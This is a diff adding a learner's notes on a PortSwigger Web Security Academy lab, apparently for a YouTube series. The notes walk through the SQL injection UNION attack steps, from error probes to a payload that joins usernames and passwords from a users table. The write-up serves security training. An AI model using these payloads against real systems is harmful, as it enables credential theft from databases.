@@ -101,3 +101,17 @@ Episode5- YouTube Channel AcronProject
         
         4- Verify that the application's response contains usernames and passwords.
 
+
+Lab: SQL injection UNION attack, retrieving multiple values in a single column:
+        Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+            My Solution:
+            #1 Detection + All the commands used = 
+                1- '                                                                             = Error = probably vulnerable
+                2- ''    => SELECT category = ''                                                 = Error = probably vulnerable
+                3- '+UNION+SELECT+NULL,'abc'-- => SELECT category = ''+UNION+SELECT+NULL,'abc'-- = print in browser = probably vulnerable 
+                                                                                                 = secend column is string
+                4- '+UNION+SELECT+'abc',NULL-- => SELECT category = '+UNION+SELECT+'abc',NULL--  = first column is probably string
+
+                5- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+                                               => SELECT category = '+UNION+SELECT+NULL,"username~password"--
+                                                                                                 = get the usernames and password so this is vulnerable
